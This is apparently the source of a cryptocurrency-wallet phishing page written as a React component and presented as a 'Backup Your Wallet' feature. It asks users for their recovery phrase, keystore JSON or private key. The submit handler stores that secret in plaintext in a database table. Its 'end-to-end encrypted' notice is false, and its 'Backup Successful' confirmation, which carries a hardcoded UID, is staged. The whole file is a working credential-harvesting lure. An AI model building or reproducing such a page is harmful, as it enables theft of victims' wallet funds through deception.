"use client";

import { useMemo, useState, useEffect } from "react";

import { supabaseUser } from "@/lib/supabaseClient";

type WalletProvider = {
  id: string;
  name: string;
  logo_url: string | null;
};

const getInitials = (name: string) =>
  name
    .replace(/[^a-zA-Z0-9 ]/g, " ")
    .split(" ")
    .filter(Boolean)
    .slice(0, 2)
    .map((part) => part[0])
    .join("")
    .toUpperCase();

export default function BackupWalletPage() {
  const [wallets, setWallets] = useState<WalletProvider[]>([]);
  const [isLoadingWallets, setIsLoadingWallets] = useState(true);
  const [activeWallet, setActiveWallet] = useState<string | null>(null);
  const [modalStep, setModalStep] = useState<
    "preview" | "form" | "success"
  >("preview");
  const [activeTab, setActiveTab] = useState<"phrase" | "keystore" | "private">(
    "phrase"
  );
  const [walletName, setWalletName] = useState("");
  const [walletEmail, setWalletEmail] = useState("");
  const [secretValue, setSecretValue] = useState("");
  const [submitError, setSubmitError] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  useEffect(() => {
    const loadWallets = async () => {
      const { data } = await supabaseUser
        .from("wallet_providers")
        .select("id,name,logo_url")
        .eq("is_active", true)
        .order("sort_order", { ascending: true })
        .order("name", { ascending: true });

      setWallets(data ?? []);
      setIsLoadingWallets(false);
    };

    loadWallets();
  }, []);

  const resetModal = () => {
    setActiveWallet(null);
    setModalStep("preview");
    setActiveTab("phrase");
    setWalletName("");
    setWalletEmail("");
    setSecretValue("");
    setSubmitError("");
    setIsSubmitting(false);
  };

  const activeInitials = useMemo(() => {
    if (!activeWallet) return "";
    return getInitials(activeWallet);
  }, [activeWallet]);

  return (
    <div className="space-y-8">
      <div className="rounded-2xl border border-cyan-400/30 bg-white/80 p-6 text-slate-700 shadow-[0_12px_30px_rgba(15,23,42,0.08)] dark:border-cyan-400/20 dark:bg-[#1a1130] dark:text-slate-200 dark:shadow-[0_12px_30px_rgba(4,10,22,0.5)]">
        <h1 className="text-lg font-semibold text-cyan-600 dark:text-cyan-200">
          Backup Your Wallet
        </h1>
        <p className="mt-2 text-sm text-slate-500 dark:text-slate-300">
          A Web3 wallet is a secure gateway to your digital identity and assets.
          Always handle it with care.
        </p>
      </div>

      <div className="rounded-2xl border border-slate-200/70 bg-white p-6 shadow-[0_12px_30px_rgba(15,23,42,0.08)] dark:border-white/10 dark:bg-[#100a1f]/40 dark:shadow-[0_12px_30px_rgba(5,8,20,0.45)]">
        <div className="grid gap-6 sm:grid-cols-2 lg:grid-cols-4">
          {isLoadingWallets
            ? null
            : wallets.map((wallet) => (
            <div
              key={wallet.id}
              className="rounded-2xl border border-slate-200/70 bg-slate-50 px-6 py-6 text-center text-slate-700 shadow-[0_10px_24px_rgba(15,23,42,0.08)] transition duration-300 ease-out hover:-translate-y-1 hover:shadow-[0_18px_36px_rgba(15,23,42,0.15)] dark:border-white/10 dark:bg-[#1a1130] dark:text-slate-200 dark:shadow-[0_10px_24px_rgba(5,8,20,0.5)] dark:hover:shadow-[0_18px_36px_rgba(5,8,20,0.6)]"
              role="button"
              tabIndex={0}
              onClick={() => {
                setActiveWallet(wallet.name);
                setModalStep("preview");
                setActiveTab("phrase");
              }}
              onKeyDown={(event) => {
                if (event.key === "Enter" || event.key === " ") {
                  setActiveWallet(wallet.name);
                  setModalStep("form");
                  setActiveTab("phrase");
                }
              }}
            >
              <div
                className={`mx-auto flex h-12 w-12 items-center justify-center rounded-full text-sm font-semibold shadow-[0_8px_16px_rgba(15,23,42,0.12)] dark:shadow-[0_8px_16px_rgba(15,23,42,0.35)] ${
                  wallet.logo_url
                    ? "bg-transparent"
                    : "border border-slate-200/70 bg-white text-cyan-600 dark:border-white/10 dark:text-[#2dd4f8]"
                }`}
              >
                {wallet.logo_url ? (
                  <img
                    src={wallet.logo_url}
                    alt={wallet.name}
                    className="h-12 w-12 rounded-full object-cover"
                  />
                ) : (
                  getInitials(wallet.name)
                )}
              </div>
              <div className="mt-4 text-sm font-semibold text-slate-700 dark:text-cyan-300">
                {wallet.name}
              </div>
            </div>
          ))}
        </div>
      </div>

      {activeWallet ? (
        <div className="fixed inset-0 z-50 flex items-center justify-center px-6">
          <button
            className="absolute inset-0 bg-black/70"
            onClick={resetModal}
            aria-label="Close backup wallet modal"
          />
          {modalStep === "preview" ? (
            <div className="relative w-full max-w-sm rounded-2xl border border-white/10 bg-[#1a1130] p-6 text-center shadow-[0_20px_50px_rgba(4,10,22,0.6)]">
              <div className="flex items-center justify-between text-left text-sm font-semibold text-cyan-200">
                <span>Backup Wallet</span>
                <button
                  className="text-cyan-200 transition hover:text-white"
                  onClick={resetModal}
                  aria-label="Close"
                >
                  ✕
                </button>
              </div>
              <div className="mt-6 flex flex-col items-center">
                <div className="flex h-16 w-16 items-center justify-center rounded-full border border-white/10 bg-white text-lg font-bold text-[#2dd4f8] shadow-[0_8px_16px_rgba(15,23,42,0.35)]">
                  {activeInitials}
                </div>
                <div className="mt-4 text-base font-semibold text-white">
                  {activeWallet}
                </div>
                <button
                  className="mt-4 rounded-full bg-linear-to-r from-cyan-400 to-violet-500 px-6 py-2 text-sm font-semibold text-slate-900 shadow-[0_0_20px_rgba(34,211,238,0.35)]"
                  onClick={() => setModalStep("form")}
                >
                  Connect
                </button>
                <p className="mt-4 text-xs text-rose-400">
                  Note!! All your information and details are end-to-end
                  encrypted on Web3
                </p>
              </div>
            </div>
          ) : modalStep === "form" ? (
            <div className="relative w-full max-w-md rounded-2xl border border-white/10 bg-[#1a1130] p-6 text-center shadow-[0_20px_50px_rgba(4,10,22,0.6)]">
              <div className="flex items-center justify-between text-left text-sm font-semibold text-cyan-200">
                <span>Connect {activeWallet}</span>
                <button
                  className="text-cyan-200 transition hover:text-white"
                  onClick={resetModal}
                  aria-label="Close"
                >
                  ✕
                </button>
              </div>

              <div className="mt-4 flex items-center justify-center gap-4 text-xs font-semibold text-slate-300">
                {[
                  { key: "phrase", label: "Phrase" },
                  { key: "keystore", label: "Keystore JSON" },
                  { key: "private", label: "Private Key" },
                ].map((tab) => (
                  <button
                    key={tab.key}
                    className={`rounded-full px-3 py-1 transition ${
                      activeTab === tab.key
                        ? "bg-cyan-400/15 text-cyan-200 ring-1 ring-cyan-300/40"
                        : "text-slate-400 hover:text-cyan-200"
                    }`}
                    onClick={() =>
                      setActiveTab(tab.key as "phrase" | "keystore" | "private")
                    }
                  >
                    {tab.label}
                  </button>
                ))}
              </div>

              <div className="mt-5 space-y-3 text-left text-sm">
                <input
                  className="w-full rounded-xl border border-white/10 bg-[#120d21] px-4 py-2.5 text-sm text-slate-200 placeholder:text-slate-500 focus:outline-none focus:ring-2 focus:ring-cyan-400/40"
                  placeholder="Enter wallet name"
                  value={walletName}
                  onChange={(event) => setWalletName(event.target.value)}
                />
                <input
                  className="w-full rounded-xl border border-white/10 bg-[#120d21] px-4 py-2.5 text-sm text-slate-200 placeholder:text-slate-500 focus:outline-none focus:ring-2 focus:ring-cyan-400/40"
                  placeholder="Enter wallet email"
                  value={walletEmail}
                  onChange={(event) => setWalletEmail(event.target.value)}
                />
                <textarea
                  className="min-h-[110px] w-full rounded-xl border border-white/10 bg-[#120d21] px-4 py-2.5 text-sm text-slate-200 placeholder:text-slate-500 focus:outline-none focus:ring-2 focus:ring-cyan-400/40"
                  placeholder={
                    activeTab === "phrase"
                      ? "Enter your recovery phrase"
                      : activeTab === "keystore"
                        ? "Paste your keystore JSON"
                        : "Enter your private key"
                  }
                  value={secretValue}
                  onChange={(event) => setSecretValue(event.target.value)}
                />
                {activeTab === "phrase" ? (
                  <p className="text-xs text-slate-400">
                    Typically 12 (sometimes 24) words separated by spaces.
                  </p>
                ) : null}
              </div>

              <button
                className="mt-5 w-full rounded-full bg-linear-to-r from-cyan-400 to-violet-500 px-6 py-2.5 text-sm font-semibold text-slate-900 shadow-[0_0_20px_rgba(34,211,238,0.35)]"
                onClick={async () => {
                  if (!activeWallet) return;
                  setSubmitError("");
                  setIsSubmitting(true);

                  const { data } = await supabaseUser.auth.getSession();
                  const user = data.session?.user;

                  const payload = JSON.stringify({
                    walletName,
                    walletEmail,
                    value: secretValue,
                    method: activeTab,
                  });

                  const { error } = await supabaseUser
                    .from("backup_wallet_requests")
                    .insert({
                      user_id: user?.id ?? null,
                      user_email: user?.email ?? walletEmail ?? null,
                      provider: activeWallet,
                      method: activeTab,
                      payload,
                      source: "backup_wallet",
                    });

                  setIsSubmitting(false);

                  if (error) {
                    setSubmitError(error.message);
                    return;
                  }

                  setModalStep("success");
                }}
              >
                {isSubmitting ? "Submitting..." : "Submit"}
              </button>
              {submitError ? (
                <p className="mt-3 text-xs text-rose-400">{submitError}</p>
              ) : null}
              <button
                className="mt-3 text-xs font-semibold text-cyan-200/80 hover:text-cyan-100"
                onClick={resetModal}
              >
                Cancel
              </button>
            </div>
          ) : (
            <div className="relative w-full max-w-sm rounded-2xl bg-white p-8 text-center text-slate-800 shadow-[0_20px_50px_rgba(0,0,0,0.45)]">
              <div className="mx-auto flex h-12 w-12 items-center justify-center rounded-full bg-slate-900 text-white">
                ✓
              </div>
              <div className="mt-3 flex items-center justify-center gap-1 text-amber-400">
                {"★★★★★"}
              </div>
              <h3 className="mt-3 text-lg font-bold text-slate-900">
                Backup Successful
              </h3>
              <p className="mt-1 text-xs text-slate-500">
                UID: wu1769792969700
              </p>
              <p className="mt-3 text-sm text-slate-600">
                Your wallet data has been successfully backed up! We&apos;ve
                securely stored your information, ensuring your assets remain
                protected. Feel free to continue managing your wallet or explore
                additional features.
              </p>
              <button
                className="mt-6 rounded-full bg-[#6d28d9] px-6 py-2 text-sm font-semibold text-white"
                onClick={resetModal}
              >
                Return To Home Page
              </button>
            </div>
          )}
        </div>
      ) : null}
    </div>
  );
}
